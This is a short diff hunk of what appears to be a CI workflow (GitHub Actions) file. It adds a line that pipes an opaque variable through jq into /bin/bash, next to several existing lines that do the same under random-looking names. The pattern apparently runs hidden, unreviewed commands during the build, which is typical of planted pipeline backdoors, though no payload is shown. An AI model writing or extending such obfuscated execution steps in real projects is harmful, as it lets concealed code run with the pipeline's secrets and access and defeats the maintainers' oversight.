@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$pwq3" | jq -r .qj6487 | /bin/bash
           echo $svfw9 | jq -r .ii00 | /bin/bash
           echo $nv5677 | jq -r .mitl4 | /bin/bash
+          echo $e23 | jq -r .p86 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
